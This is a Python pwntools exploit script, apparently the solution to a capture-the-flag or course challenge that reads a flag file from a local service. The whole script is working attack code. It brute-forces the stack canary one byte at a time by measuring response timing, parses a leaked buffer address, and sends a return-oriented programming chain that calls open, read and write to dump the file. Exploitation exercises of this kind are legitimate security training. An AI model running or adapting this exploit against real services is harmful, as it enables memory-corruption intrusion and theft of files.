import os
import re
import sys
import time

from pwn import *

context.arch = "amd64"
context.os = 'linux'

host = 'localhost'

def exploit(port):
    # Set the base payload with the flag location, str termination
    # Then fill the buffer. Last canary digit is \x00
    base_payload = b'/flag\x00'+ b'A'*34+ b'\x00'
    
    # For the remaining bits, brute force the value by calculating
    # the response time
    for i in range(0, 7):
        bestTime = 0
        bestValue = -1
        for j in range(0, 256):
            p = remote(host, port)
            payload = base_payload + j.to_bytes(1, 'little')
            sendTime = time.time()
            p.send(payload)
            p.recvuntil(b"feedback\n")
            timeDiff = time.time() - sendTime
            if(timeDiff > bestTime):
                bestTime = timeDiff
                bestValue = j
            p.close()
        base_payload += bestValue.to_bytes(1, 'little')
        
    # Read in the buffer address    
    p = remote(host, port)
    p.recvuntil(b'Hint:')
    buffer_address = int(p.recvline()[-13:-1], 16)
    p.close()
        
    pop_rdi = 0x40152f
    pop_rdx = 0x40152b
    pop_rsi_r15 = 0x40152d
    mov_rdi_rax = 0x401533
       
    write_address = 0x401040
    open_address = 0x4010f0
    read_address = 0x4010a0
        
    payload  = base_payload + b'B'*8
        
    # open('./flag', 0)
    payload += p64(pop_rdi)
    payload += p64(buffer_address)
    payload += p64(pop_rsi_r15)
    payload += p64(0)
    payload += p64(0)
    payload += p64(open_address)
       
    # move fd from rax to rdi
    payload += p64(mov_rdi_rax)
     
    # read(fd, buf, 40)
    payload += p64(pop_rsi_r15)
    payload += p64(buffer_address)
    payload += p64(0)
    payload += p64(pop_rdx)
    payload += p64(40)
    payload += p64(read_address)
     
    # write(4, buf, 40)
    payload += p64(pop_rdi)
    payload += p64(4)
    payload += p64(pop_rsi_r15)
    payload += p64(buffer_address)
    payload += p64(0)
    payload += p64(pop_rdx)
    payload += p64(40)
    payload += p64(write_address)
        
    p = remote(host, port)
    p.send(payload)

    return p.readall()

def parse_flag(out):
    m = re.search("(ee517{[^}]+})", out)
    assert m is not None
    return m.groups()[0]

if __name__ == '__main__':
    if not "PORT" in os.environ:
        print("[!] Please specify the port number")
        exit(1)

    out = exploit(int(os.environ['PORT'])).decode('utf-8')
    print(parse_flag(out))
